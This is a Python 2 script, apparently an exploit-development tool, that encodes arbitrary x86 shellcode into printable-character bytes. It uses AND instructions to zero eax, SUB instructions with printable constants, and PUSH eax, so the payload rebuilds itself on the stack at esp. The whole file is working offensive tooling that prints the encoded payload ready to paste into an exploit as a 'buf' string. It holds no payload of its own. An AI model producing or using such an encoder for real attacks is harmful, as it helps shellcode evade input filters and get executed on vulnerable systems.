#!/usr/bin/env python
"""
Attempts to do an alpha-numeric encoding of arbitrary 4-byte x86 instruction sets.
Every 4-byte word in unencoded shellcode should result in six instructions in the following format:

AND eax, 554e4d4a ; alphanumeric zero-ing of eax
AND eax, 2a313235 ; alphanumeric zero-ing of eax
SUB eax, <4-byte alphanumeric const>
SUB eax, <4-byte alphanumeric const>
SUB eax, <4-byte alphanumeric const>
PUSH eax

alphanumeric characters 0x20 - 0x7e (inclusive)

IMPORTANT NOTE:
This encoder will decode to esp. The user must therefore have some means of jmping to esp after everything is decoded,
or must adjust esp to point to an address at the end of the encoded payload before execution of this stage begins.
"""

import sys
import itertools
import random

# alphanumeric zero-ing of eax
# AND eax, 554e4d4a
# AND eax, 2a313235
EAX_ZEROIZER = "\x25\x4a\x4d\x4e\x55"
EAX_ZEROIZER += "\x25\x35\x32\x31\x2a"

ALLOWED_BYTES = range(0x20, 0x7f)

def usage():
	print "[*] Usage: " + sys.argv[0] + " source_file"
	print "     -> source_file should contain the raw bytes to be encoded"
	sys.exit()

def getChunks(fname):
	print "[*] Reading file"
	try:
		f = open(fname, "rb")
	except IOError:
		usage()

	pre_encoded = ""
	shellcode_len = 0
	while True:
		b = f.read(1)
		if b == "": break
		pre_encoded += b
		shellcode_len += 1

	four_byte_chunks = [pre_encoded[idx:idx + 4] for idx in range(0, len(pre_encoded), 4)]

	# Pad shellcode with nops if not perfectly divisible by 4
	if len(four_byte_chunks[-1]) != 4:
		four_byte_chunks[-1] = four_byte_chunks[-1] + (4 - len(four_byte_chunks[-1])) * '\x90'

	print "[+] Shellcode", str(shellcode_len), "bytes split into", str(len(four_byte_chunks)), "chunks"
	four_byte_chunks.reverse() # reverse because first pushed will be last instr executed
	return four_byte_chunks


def getByteDigit(word32, idx):
	# Get byte in 32-bit word at position idx (counting from LSB)
	assert(idx in range(0, 4))
	ret = (word32 / pow(0x100, idx)) % 0x100
	assert(ret in range(0, 256))
	return ret


def getSubtractors(int_bytes, randomize=True):
	assert (len(int_bytes) == 4), "getSubtractors was passed a chunk that was not four bytes"
	carry_over = 0
	subtractors = ["", "", ""]

	for idx, curr_byte in enumerate(reversed(int_bytes)): # loop from LSB to MSB

		loop = itertools.product(ALLOWED_BYTES, ALLOWED_BYTES, ALLOWED_BYTES)

		if randomize: # TODO: Conversion from loop to iterable slows things down considerably
			listed_iterator = list(itertools.product(ALLOWED_BYTES, ALLOWED_BYTES, ALLOWED_BYTES))
			random.shuffle(listed_iterator)
			loop = listed_iterator

		for candidate_subtractors in loop:
			candidate_res = (0x0 + carry_over) - sum(candidate_subtractors)

			if candidate_res % 0x100 == curr_byte:
				carry_over = candidate_res / 0x100

				for idx, s in enumerate(candidate_subtractors):
					subtractors[idx] = chr(s) + subtractors[idx]
				break
		else:
			print "[-] Not enough allowed bytes; could not find valid 3-sub combination to generate necessary instruction"
			return

	return subtractors


def buildShellcode(subtractors):
	ret = ""
	ret += EAX_ZEROIZER

	# SUB eax, < 4-byte alphanumeric >
	for s in subtractors:
		ret += "\x2d" + s[::-1] # reverse values

	# PUSH eax
	ret += "\x50"
	return ret


if __name__ == "__main__":

	if len(sys.argv) != 2:
		usage()

	chunks = getChunks(sys.argv[1])
	encoded = list()

	for idx, chunk in enumerate(chunks):
		# convert code to ints
		code_as_ints = list()
		for c in chunk:
			code_as_ints.append(ord(c))

		print "[*] Encoding chunk", idx + 1, "of", str(len(chunks)) + "..."
		subtractors = getSubtractors(code_as_ints)
		encoded += buildShellcode(subtractors)


	encoded_final = ''.join(encoded)
	print "[+] Encoding complete! Encoded payload length:", str(len(encoded_final))
	print "Raw payload:"
	print encoded_final

	print "Pythonic payload:"
	hex_final = "buf = \""
	for idx, c in enumerate(encoded_final):
		if idx % 10 == 0:
			hex_final += "\"\nbuf += \""
		hex_final += '\\' + hex(ord(c))[1:]

	hex_final += "\""
	print hex_final
